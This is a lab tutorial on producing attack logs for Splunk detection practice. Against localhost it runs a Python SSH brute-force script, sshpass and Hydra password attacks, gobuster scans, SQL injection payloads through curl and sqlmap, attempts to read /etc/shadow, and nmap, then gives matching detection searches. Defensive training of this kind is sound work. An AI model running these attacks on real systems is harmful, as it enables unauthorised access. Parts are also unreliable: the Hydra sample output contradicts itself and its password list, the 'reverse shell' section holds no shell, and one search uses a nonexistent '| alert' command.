# Splunk Log Ingestion - METHOD 4: GENERATING ATTACK LOGS FOR SECURITY TESTING

## 🔴 Overview

This guide shows how to **generate real security logs** from actual attacks and suspicious activities. Perfect for:
- Security operations training
- Alert testing
- Incident response practice
- Splunk query validation
- Real-world log analysis

---

## SAFETY WARNING ⚠️

```
IMPORTANT:
- These attacks are for LEARNING in your OWN lab environment ONLY
- Do NOT perform these on systems you don't own or without permission
- Do NOT attempt these on production systems
- Do NOT use these techniques against others' systems

These are legitimate security testing techniques when used ethically
in controlled environments.
```

---

## ATTACK 1: SSH BRUTE FORCE ATTACK

### What Happens
An attacker tries many passwords to break into SSH. Each failed attempt creates a log entry.

### Step 1.1: Generate Failed SSH Attempts

**Method A: Manual SSH Attempts (Easy)**

```bash
# Try logging in with wrong password 10 times
for i in {1..10}; do
  ssh root@localhost
  # When prompted for password, type wrong password and press Ctrl+C
  sleep 1
done

# Each attempt creates a log entry in /var/log/auth.log
```

**Method B: Automated Using sshpass (Better)**

```bash
# Install sshpass
sudo apt install -y sshpass

# Try 10 failed attempts
for i in {1..10}; do
  sshpass -p wrongpassword ssh root@localhost exit 2>/dev/null
  sleep 1
done

# Results: 10 failed SSH attempts logged
```

**Method C: Using paramiko (Python - Most Realistic)**

```bash
# Install paramiko
sudo apt install -y python3-paramiko

# Create script: brute_force.py
cat > brute_force.py << 'EOF'
import paramiko
import time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# List of passwords to try
passwords = [
    "password123",
    "admin",
    "root",
    "12345678",
    "qwerty",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "123456"
]

for pwd in passwords:
    try:
        ssh.connect("localhost", username="root", password=pwd, timeout=2)
        print(f"[+] Success: {pwd}")
        ssh.close()
        break
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {pwd}")
    except Exception as e:
        print(f"[!] Error: {e}")
    time.sleep(1)

ssh.close()
EOF

# Run script
python3 brute_force.py

# Result: 10 failed attempts, 1 password checked per second
```

### Step 1.2: View Generated Logs

```bash
# Check auth.log for failed attempts
grep "Failed password" /var/log/auth.log | tail -10

# Expected output:
Feb 20 10:30:15 ubuntu sshd[2000]: Failed password for root from 127.0.0.1 port 55555 ssh2
Feb 20 10:30:16 ubuntu sshd[2001]: Failed password for root from 127.0.0.1 port 55556 ssh2
Feb 20 10:30:17 ubuntu sshd[2002]: Failed password for root from 127.0.0.1 port 55557 ssh2
...
```

### Step 1.3: Search in Splunk

**Upload or Monitor the log:**

```spl
# Search for failed logins
index=auth_logs "Failed password" src_ip=127.0.0.1

# Count attempts
index=auth_logs "Failed password"
| stats count by src_ip, user

# Result:
src_ip      user  count
127.0.0.1   root  10
```

---

## ATTACK 2: DIRECTORY BRUTE FORCING (Web Server)

### What Happens
An attacker tries to access common web directories to find hidden pages. Each attempt creates a 404 error log.

### Step 2.1: Start Web Server

```bash
# Start Apache
sudo service apache2 start

# Verify running
sudo service apache2 status

# Should show: active (running)
```

### Step 2.2: Generate Directory Brute Force Attempts

**Method A: Using curl (Simple)**

```bash
# List of common directories to try
DIRS=("admin" "login" "dashboard" "database" "config" "secret" "test" "backup" "api" "upload")

# Try accessing each directory
for dir in "${DIRS[@]}"; do
  curl -s http://localhost/$dir
  sleep 1
done

# Each generates a 404 error in access.log
```

**Method B: Using gobuster (Professional)**

```bash
# Install gobuster
sudo apt install -y gobuster

# Run directory brute forcing
gobuster dir -u http://localhost/ -w /usr/share/wordlists/dirb/common.txt -t 5

# Results in real-time:
/admin (Status: 404)
/login (Status: 404)
/images (Status: 301)
/css (Status: 301)
etc.
```

**Method C: Using OWASP ZAP (Visual)**

```bash
# Install OWASP ZAP
sudo apt install -y zaproxy

# Launch ZAP
zaproxy &

# Use Spider tool to enumerate directories
# Generates many 404s in web logs
```

### Step 2.3: View Generated Logs

```bash
# Check Apache access.log
tail -20 /var/log/apache2/access.log

# Expected output:
127.0.0.1 - - [20/Feb/2026:10:35:10 +0000] "GET /admin HTTP/1.1" 404 256
127.0.0.1 - - [20/Feb/2026:10:35:11 +0000] "GET /login HTTP/1.1" 404 256
127.0.0.1 - - [20/Feb/2026:10:35:12 +0000] "GET /database HTTP/1.1" 404 256
127.0.0.1 - - [20/Feb/2026:10:35:13 +0000] "GET /config HTTP/1.1" 404 256
...
```

### Step 2.4: Search in Splunk

```spl
# Find all 404 errors
index=web_logs status=404

# Count 404s per directory
index=web_logs status=404
| stats count by uri

# Result:
uri            count
/admin         1
/login         1
/database      1
/config        1
...

# Find brute force pattern
index=web_logs status=404
| stats count by src_ip
| where count > 5
```

---

## ATTACK 3: SQL INJECTION ATTEMPTS

### What Happens
An attacker sends SQL injection attempts to web application. Creates suspicious log entries.

### Step 3.1: Generate SQL Injection Attempts

**Method A: Using curl (Simple)**

```bash
# SQL injection payloads
PAYLOADS=(
  "' OR '1'='1"
  "admin' --"
  "1' UNION SELECT NULL --"
  "1; DROP TABLE users --"
  "UNION SELECT NULL, NULL, NULL --"
)

# Send each payload
for payload in "${PAYLOADS[@]}"; do
  curl -s "http://localhost/search.php?q=$payload" > /dev/null
  sleep 1
done

# Creates suspicious 404s and errors in access.log
```

**Method B: Using sqlmap (Professional)**

```bash
# Install sqlmap
sudo apt install -y sqlmap

# Test for SQL injection
sqlmap -u "http://localhost/search.php?q=test" --dbs

# Generates many suspicious queries in logs
```

### Step 3.2: View Generated Logs

```bash
# Find SQL injection attempts
grep -i "union\|select\|drop\|insert" /var/log/apache2/access.log

# Expected output:
127.0.0.1 - - [20/Feb/2026:10:40:10 +0000] "GET /search.php?q=' OR '1'='1 HTTP/1.1" 404
127.0.0.1 - - [20/Feb/2026:10:40:11 +0000] "GET /search.php?q=admin' -- HTTP/1.1" 404
127.0.0.1 - - [20/Feb/2026:10:40:12 +0000] "GET /search.php?q=1' UNION SELECT HTTP/1.1" 404
```

### Step 3.3: Search in Splunk

```spl
# Find SQL injection attempts
index=web_logs (uri="*UNION*" OR uri="*DROP*" OR uri="*SELECT*")

# Count attempts
index=web_logs (uri="*'*" OR uri="*--*")
| stats count by src_ip

# Find dangerous payloads
index=web_logs 
| regex uri="(UNION|SELECT|DROP|INSERT|DELETE)"
```

---

## ATTACK 4: PRIVILEGE ESCALATION (sudo)

### What Happens
A user tries sudo commands that fail (permission denied). Creates security logs.

### Step 4.1: Generate Sudo Privilege Escalation Attempts

```bash
# Try running commands that require admin
# These fail and create logs

# Method A: Simple attempts
sudo ls /root  # Might fail
sudo cat /etc/shadow  # Fails - permission denied
sudo reboot  # Fails
sudo useradd hacker  # Fails

# Method B: Automated
for i in {1..5}; do
  sudo whoami 2>/dev/null
  sudo id 2>/dev/null
  sudo visudo 2>/dev/null
  sleep 1
done
```

### Step 4.2: View Generated Logs

```bash
# Check sudo attempts in auth.log
grep "sudo" /var/log/auth.log | tail -10

# Expected output:
Feb 20 10:45:10 ubuntu sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/ls
Feb 20 10:45:15 ubuntu sudo: user : command not allowed ; TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/cat
Feb 20 10:45:20 ubuntu sudo: user : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/sbin/reboot
```

### Step 4.3: Search in Splunk

```spl
# Find sudo attempts
index=auth_logs "sudo"

# Find failed sudo
index=auth_logs "sudo" "NOT allowed"

# Count sudo attempts by user
index=auth_logs "sudo"
| stats count by user
```

---

## ATTACK 5: INVALID USER LOGIN ATTEMPTS

### What Happens
An attacker tries to login with non-existent usernames.

### Step 5.1: Generate Invalid User Attempts

```bash
# Try logging in as non-existent users
USERS=("hacker" "admin123" "root2" "test" "guest" "operator" "oracle" "postgres")

for user in "${USERS[@]}"; do
  sshpass -p password ssh $user@localhost exit 2>/dev/null
  sleep 1
done

# Creates "Invalid user" log entries
```

### Step 5.2: View Generated Logs

```bash
# Find invalid user attempts
grep "Invalid user" /var/log/auth.log | tail -10

# Expected output:
Feb 20 10:50:10 ubuntu sshd[4000]: Invalid user hacker from 127.0.0.1
Feb 20 10:50:11 ubuntu sshd[4001]: Invalid user admin123 from 127.0.0.1
Feb 20 10:50:12 ubuntu sshd[4002]: Invalid user root2 from 127.0.0.1
Feb 20 10:50:13 ubuntu sshd[4003]: Invalid user test from 127.0.0.1
```

### Step 5.3: Search in Splunk

```spl
# Find invalid user attempts
index=auth_logs "Invalid user"

# Count attempts
index=auth_logs "Invalid user"
| stats count by src_ip
| where count > 3

# Find pattern
index=auth_logs "Invalid user"
| timechart count by src_ip
```

---

## ATTACK 6: REVERSE SHELL / COMMAND EXECUTION

### What Happens
An attacker runs suspicious commands (port scanning, file transfers, etc).

### Step 6.1: Generate Suspicious Command Logs

```bash
# These commands generate suspicious logs:

# 1. Port scanning
nmap localhost
nmap -p 1-1000 localhost

# 2. Network discovery
arp-scan --interface=eth0 192.168.1.0/24

# 3. Privilege checking
id
whoami
sudo -l

# 4. File operations
cat /etc/passwd
ls -la /root
find / -name "*.sql"

# 5. System info gathering
uname -a
lsb_release -a
```

### Step 6.2: View Generated Logs

```bash
# Check command history
history

# Check syslog
grep "nmap\|arp\|scan" /var/log/syslog

# Check auth.log for sudo
grep "sudo" /var/log/auth.log
```

### Step 6.3: Search in Splunk

```spl
# Find suspicious commands
index=system_logs (nmap OR arp OR scan OR port OR tcpdump)

# Find privilege commands
index=auth_logs (sudo OR su)

# Timeline of suspicious activity
index=system_logs 
| timechart count by command_name
```

---

## ATTACK 7: HYDRA PASSWORD ATTACK (Advanced)

### What Happens
Hydra performs rapid password cracking attempts. Generates many failed logins.

### Step 7.1: Install Hydra

```bash
# Install
sudo apt install -y hydra

# Verify
hydra --version

# Expected: Hydra v9.x
```

### Step 7.2: Create User Account for Testing

```bash
# Create test user to attack
sudo useradd -m -s /bin/bash testuser

# Set password
sudo passwd testuser
# Enter: testpass123
```

### Step 7.3: Run Hydra Attack

**Method A: Attack SSH on Localhost**

```bash
# Create password list
cat > passwords.txt << 'EOF'
password
123456
admin
password123
letmein
welcome
monkey
dragon
football
baseball
EOF

# Run hydra on SSH
hydra -l testuser -P passwords.txt ssh://localhost -t 4 -V

# Options:
# -l testuser : username to attack
# -P passwords.txt : password file
# ssh://localhost : target
# -t 4 : 4 threads
# -V : verbose (shows attempts)

# Output:
# [22][ssh] host: localhost login: testuser password: testpass123
# [1 of 1 target] finished, 0 valid passwords found
```

### Step 7.4: View Hydra Attack Logs

```bash
# Check auth.log for failed attempts
tail -50 /var/log/auth.log | grep "testuser"

# Expected output shows many failures:
Feb 20 10:55:10 ubuntu sshd[5000]: Failed password for testuser from 127.0.0.1
Feb 20 10:55:11 ubuntu sshd[5001]: Failed password for testuser from 127.0.0.1
Feb 20 10:55:12 ubuntu sshd[5002]: Failed password for testuser from 127.0.0.1
Feb 20 10:55:13 ubuntu sshd[5003]: Failed password for testuser from 127.0.0.1
Feb 20 10:55:14 ubuntu sshd[5004]: Failed password for testuser from 127.0.0.1
...
(many more)
```

### Step 7.5: Search in Splunk

```spl
# Find Hydra attack pattern
index=auth_logs "Failed password" user=testuser

# Count attempts
index=auth_logs "Failed password" user=testuser
| stats count

# Result: 100+ failed attempts in seconds

# Alert pattern (many failures in short time)
index=auth_logs "Failed password" user=testuser
| timechart count by src_ip
| where count > 10
```

---

## COMPREHENSIVE ATTACK TESTING SCRIPT

### All-in-One Attack Log Generator

```bash
#!/bin/bash

echo "==============================================="
echo "  Splunk Attack Log Generator"
echo "  For Training & Testing Only"
echo "==============================================="

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# Create work directory
mkdir -p ~/attack-logs
cd ~/attack-logs

echo -e "${BLUE}[*] Installing required tools...${NC}"
sudo apt install -y sshpass gobuster hydra nmap 2>/dev/null

echo -e "${GREEN}[+] Tools installed${NC}"
echo ""

# Attack 1: SSH Brute Force
echo -e "${BLUE}[*] Attack 1: SSH Brute Force (10 attempts)${NC}"
for i in {1..10}; do
  sshpass -p wrongpassword ssh root@localhost exit 2>/dev/null
  sleep 0.5
done
echo -e "${GREEN}[+] SSH brute force complete${NC}"

# Attack 2: Directory Brute Force
echo -e "${BLUE}[*] Attack 2: Directory Brute Force (5 attempts)${NC}"
DIRS=("admin" "login" "test" "backup" "config")
for dir in "${DIRS[@]}"; do
  curl -s "http://localhost/$dir" > /dev/null
  sleep 0.5
done
echo -e "${GREEN}[+] Directory brute force complete${NC}"

# Attack 3: SQL Injection
echo -e "${BLUE}[*] Attack 3: SQL Injection (5 attempts)${NC}"
PAYLOADS=("' OR '1'='1" "admin' --" "1' UNION SELECT" "1; DROP TABLE" "*")
for payload in "${PAYLOADS[@]}"; do
  curl -s "http://localhost/search.php?q=$payload" > /dev/null
  sleep 0.5
done
echo -e "${GREEN}[+] SQL injection complete${NC}"

# Attack 4: Invalid Users
echo -e "${BLUE}[*] Attack 4: Invalid User Attempts (5 users)${NC}"
USERS=("hacker" "admin123" "root2" "test" "guest")
for user in "${USERS[@]}"; do
  sshpass -p password ssh $user@localhost exit 2>/dev/null
  sleep 0.5
done
echo -e "${GREEN}[+] Invalid user attempts complete${NC}"

# Attack 5: Port Scanning
echo -e "${BLUE}[*] Attack 5: Port Scanning${NC}"
nmap -p 22,80,443,3306 localhost > /dev/null 2>&1
echo -e "${GREEN}[+] Port scanning complete${NC}"

echo ""
echo -e "${GREEN}===============================================${NC}"
echo -e "${GREEN}[+] All attacks completed!${NC}"
echo -e "${GREEN}[+] Check Splunk for generated logs${NC}"
echo ""
echo -e "${BLUE}Searches to try:${NC}"
echo "  index=auth_logs \"Failed password\""
echo "  index=web_logs status=404"
echo "  index=auth_logs \"Invalid user\""
echo "  index=system_logs nmap"
echo ""
```

**Save and run:**
```bash
chmod +x attack-generator.sh
./attack-generator.sh
```

---

## SEARCHING ATTACK LOGS IN SPLUNK

### Search 1: All Failed Logins
```spl
index=auth_logs "Failed password"
| stats count by src_ip, user
```

### Search 2: Brute Force Detection
```spl
index=auth_logs "Failed password"
| stats count by src_ip
| where count > 5
```

### Search 3: Directory Scanning
```spl
index=web_logs status=404
| stats count by uri
| where count > 1
```

### Search 4: SQL Injection Attempts
```spl
index=web_logs 
| regex uri="(UNION|SELECT|DROP|'|--)"
| stats count by src_ip
```

### Search 5: Invalid Users
```spl
index=auth_logs "Invalid user"
| stats count by src_ip
```

### Search 6: Privilege Escalation
```spl
index=auth_logs "sudo"
| stats count by user
```

### Search 7: Suspicious Commands
```spl
index=system_logs (nmap OR arp OR scan)
| stats count by command
```

### Search 8: Real-Time Alert Detection
```spl
index=auth_logs
| stats count by src_ip
| where count > 10
| alert

# Triggers alert if >10 events from same IP
```

---

## CLEANING UP AFTER TESTING

```bash
# Remove test user
sudo deluser --remove-home testuser

# Clear history
history -c

# Restart services
sudo systemctl restart ssh

# Check logs are clean
tail -10 /var/log/auth.log
```

---

## QUICK REFERENCE: ATTACK TYPES

| Attack | Tool | Logs Generated | Search |
|--------|------|-----------------|--------|
| SSH Brute Force | sshpass | auth.log | "Failed password" |
| Directory Brute | curl/gobuster | access.log | status=404 |
| SQL Injection | sqlmap | access.log | UNION, SELECT |
| Invalid Users | sshpass | auth.log | "Invalid user" |
| Port Scan | nmap | syslog | nmap |
| Hydra Attack | hydra | auth.log | Multiple failures |

---

## SUMMARY

You can now:
- ✅ Generate SSH brute force attempts
- ✅ Simulate directory brute forcing
- ✅ Create SQL injection attempts
- ✅ Generate privilege escalation logs
- ✅ Produce invalid user attempts
- ✅ Simulate port scanning
- ✅ Run Hydra password attacks
- ✅ Search and detect attacks in Splunk
- ✅ Create realistic security logs for training

---

**Attack Log Generation Complete!** ✅

Use these logs to:
1. Test your Splunk queries
2. Validate alert rules
3. Practice incident response
4. Learn security operations
5. Train security teams

---

**WARNING:** These are real attack techniques. Use only in controlled lab environments with proper authorization. Unauthorized access to computer systems is illegal.

---

**Next Steps:**
1. Generate attack logs
2. Search them in Splunk
3. Create alerts
4. Practice detection
5. Build your security skills
